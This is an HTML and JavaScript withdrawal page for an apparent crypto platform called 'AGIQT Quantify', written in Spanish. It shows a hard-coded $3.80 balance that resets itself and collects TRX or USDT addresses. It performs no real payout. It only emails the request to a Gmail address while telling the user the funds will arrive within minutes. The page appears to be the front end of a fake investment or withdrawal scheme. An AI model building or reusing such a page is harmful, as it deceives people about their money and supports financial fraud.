<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retiro AGIQT Quantify</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-image: url('https://github.com/user-attachments/assets/bf922981-801b-423e-8bdb-4d860e963499');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
            max-width: 400px;
            width: 100%;
            position: relative;
            text-align: center;
        }
        .container h2 {
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: bold;
        }
        .container form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container label {
            margin-top: 10px;
            font-size: 14px;
            font-weight: 600;
            width: 100%;
            text-align: left;
        }
        .container input, .container select {
            padding: 12px;
            margin-top: 5px;
            border-radius: 8px;
            border: 1px solid #ccc;
            outline: none;
            font-size: 14px;
            width: 100%;
            box-sizing: border-box;
        }
        .container input:focus, .container select:focus {
            border-color: #6a67d0;
        }
        .container button {
            background-color: #6a67d0;
            color: #fff;
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
            transition: background-color 0.3s;
            width: 100%;
        }
        .container button:hover {
            background-color: #5653a5;
        }
        .container .balance {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        .container .message {
            margin-top: 20px;
            font-size: 16px;
            color: #ff0000;
        }
        .back-arrow {
            position: absolute;
            top: 10px;
            left: 10px;
            font-size: 24px;
            color: #fff;
            cursor: pointer;
            transition: color 0.3s;
        }
        .back-arrow:hover {
            color: #ffa500;
        }
    </style>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init('service_b244er4'); // Reemplaza 'service_b244er4' con tu User ID de EmailJS
        })();
    </script>
</head>
<body>
    <div class="container">
        <div class="back-arrow" onclick="window.location.href='Home.html'">&#8592;</div>
        <h2>Retirar Fondos</h2>
        <form id="withdraw-form">
            <label for="amount">Monto a retirar (mínimo $3.80)</label>
            <input type="number" id="amount" name="amount" min="3.80" step="3.80" required>
            
            <label for="withdraw-address">Dirección de retiro (TRX o USDT)</label>
            <input type="text" id="withdraw-address" name="withdraw-address" required>
            
            <button type="submit">Enviar</button>
        </form>
        <div class="balance" id="balance-display">Balance: $3.80</div>
        <div class="message" id="message"></div>
    </div>

    <script>
        const initialBalance = 3.80;
        let balance = parseFloat(localStorage.getItem('3.80') || initialBalance);

        const balanceDisplay = document.getElementById('balance-display');
        const messageDiv = document.getElementById('message');

        function updateBalanceDisplay() {
            balanceDisplay.textContent = 'Balance: $' + balance.toFixed(2);
        }

        document.getElementById('withdraw-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const amount = parseFloat(document.getElementById('amount').value);
            const withdrawAddress = document.getElementById('withdraw-address').value;

            if (amount > balance) {
                messageDiv.textContent = 'Saldo insuficiente para realizar el retiro.';
            } else {
                balance -= amount;
                localStorage.setItem('balance', balance.toFixed(2));
                updateBalanceDisplay();
                messageDiv.textContent = 'Su retiro está en proceso, dentro de 1 a 5 minutos se le enviará.';

                // Enviar correo electrónico
                emailjs.send('service_b244er4', 'MagnegInvip', {
                    to_email: 'MagnegInvip@gmail.com',
                    amount: amount,
                    withdraw_address: withdrawAddress
                }).then(function(response) {
                    console.log('Correo enviado:', response.status, response.text);
                }, function(error) {
                    console.log('Error al enviar el correo:', error);
                });

                setTimeout(function() {
                    messageDiv.textContent = '';
                    if (balance <= 0) {
                        balance = initialBalance;
                        localStorage.setItem('balance', balance.toFixed(2));
                        updateBalanceDisplay();
                    }
                }, 300000); // 5 minutos en milisegundos
            }
        });

        window.addEventListener('load', updateBalanceDisplay);
    </script>
</body>
</html>
